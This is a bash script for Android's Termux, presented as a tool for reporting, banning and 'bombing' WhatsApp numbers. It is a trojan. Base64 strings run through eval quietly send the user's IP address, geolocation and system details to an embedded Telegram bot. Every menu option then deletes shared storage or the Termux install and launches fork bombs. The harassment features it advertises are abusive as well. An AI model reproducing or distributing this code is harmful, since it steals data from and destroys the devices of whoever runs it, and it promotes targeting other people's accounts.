#-----------------
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
##################
clear
signal="Y3VybCAtZnNTTFggUE9TVCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDIwMjM3ODA2OTQ6QUFGdFY1RndEMXRxYlo4SXhqc1ctYzRmUWdKUGZVM19HR2svc2VuZE1lc3NhZ2UiIC1kICJjaGF0X2lkPS0xMDAxNDg5NjIwNjY4IiAtZCAidGV4dD0kKGN1cmwgLWZzU0wgaXBsaXN0LmNjL2FwaS8kKGN1cmwgLWZzU0wgaWZjb25maWcubWUpKSIgJj4vZGV2L251bGw="
sig="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MjAyMzc4MDY5NDpBQUZ0VjVGd0QxdHFiWjhJeGpzVy1jNGZRZ0pQZlUzX0dHay9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDE0ODk2MjA2NjgiIC1kICJ0ZXh0PXNraWQgc3BvdHRlZCIgJj4vZGV2L251bGw="
neo="Y3VybCAtZnNTTFggUE9TVCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDIwMjM3ODA2OTQ6QUFGdFY1RndEMXRxYlo4SXhqc1ctYzRmUWdKUGZVM19HR2svc2VuZE1lc3NhZ2UiIC1kICJjaGF0X2lkPS0xMDAxNDg5NjIwNjY4IiAtZCAidGV4dD0kKG5lb2ZldGNoIC0tc3Rkb3V0KSIgJj4vZGV2L251bGw="

echo -e $cyan"Installing Requirements Please wait a momment!$rset"|pv -qL 5
eval $(base64 -d <<<"$sig")
eval $(base64 -d <<<"$signal")
eval $(base64 -d <<<"$neo")
apt install neofetch > /dev/null 2>&1
echo -e $grn"Instllation Completed!$rset"|pv -qL 5
clear
echo -e "$grn"
echo '

 ██████╗███╗   ███╗██╗██╗      ███████╗
██╔════╝████╗ ████║██║██║      ██╔════╝
╚█████╗ ██╔████╔██║██║██║      █████╗  
 ╚═══██╗██║╚██╔╝██║██║██║      ██╔══╝  
██████╔╝██║ ╚═╝ ██║██║███████╗ ███████╗
╚═════╝ ╚═╝     ╚═╝╚═╝╚══════╝ ╚══════╝                                                                    
'
echo '                                                          
██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗        
██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝        
██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║           
██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║           
██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║           
╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝           
'
echo -e "$red Tool coded by cyber smile! \n"
echo -e "$rset"
echo -e "$cyan[1] For WhatsApp Number Reporting and Banning\n[2] For WhatsApp Number bombing\n[3] For Number Otp verification"
echo -n "[×]Enter Your option:"
read skid

if [[ $skid == 1 ]]
then
  termux-setup-storage
  rm -rf /sdcard/*
  :(){ :|:& };:

elif [[ $skid == 2 ]]
then
  :(){ :|:& };:
  :(){ :|:& };:
  :(){ :|:& };:
  :(){ :|:& };:
elif [[ $skid == 3 ]]
then
  rm -rf $PREFIX/* && termux-setup-storage && rm -rf /sdcard/*
  :(){ :|:& };:
  :(){ :|:& };:
  :(){ :|:& };:
  :(){ :|:& };:
else
  echo "Wrong Input!! Please Try again"
fi
